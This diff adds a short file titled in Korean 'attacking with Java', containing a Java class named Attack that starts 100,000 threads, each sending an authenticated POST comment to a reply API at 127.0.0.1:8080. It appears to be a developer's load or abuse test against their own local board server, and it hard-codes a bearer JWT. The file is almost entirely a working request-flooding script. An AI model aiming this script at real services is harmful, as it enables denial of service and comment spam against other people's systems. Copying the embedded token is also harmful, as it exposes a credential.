@@ -1,0 +1,47 @@
+자바로 공격해보기
+
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+import java.io.PrintWriter;
+import java.net.HttpURLConnection;
+import java.net.URL;
+
+public class Attack {
+    public static void main(String[] args) {
+        String targetUrl = "http://127.0.0.1:8080/api/reply";  // 요청할 URL
+        String jsonInputString = """
+                    {"boardId":100, "comment":"댓글이다"}
+                """;
+
+        for (int i = 0; i < 100000; i++) {
+            new Thread(() -> {
+                try {
+                    URL url = new URL(targetUrl);
+                    // HttpURLConnection 객체 생성
+                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+
+                    // 요청 방식 설정 (POST)
+                    conn.setRequestMethod("POST");
+                    // 요청에 JSON 형식으로 데이터를 보낸다고 명시
+                    conn.setRequestProperty("Content-Type", "application/json; utf-8");
+                    conn.setRequestProperty("Authorization", "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJzdWIiOiLrsJTrs7QiLCJpZCI6MSwiZXhwIjoxNzI3NjU2MjQzLCJ1c2VybmFtZSI6InNzYXIifQ.jnvac_lPEWbiFmVOrA_ZGvpxTesOBk6JleP0btbiPgCaqEbRAsBTiYl_jw2r_HPBKqT8EAiSQ9Zxd7M2kmpMVg");
+                    conn.setDoOutput(true);
+                    PrintWriter out = new PrintWriter(conn.getOutputStream());
+                    out.println(jsonInputString);
+                    out.flush();
+
+                    BufferedReader br = new BufferedReader(
+                            new InputStreamReader(conn.getInputStream())
+                    );
+                    System.out.println(br.readLine());
+
+                    conn.disconnect();
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
+            }).start();
+
+        }
+
+    }
+}
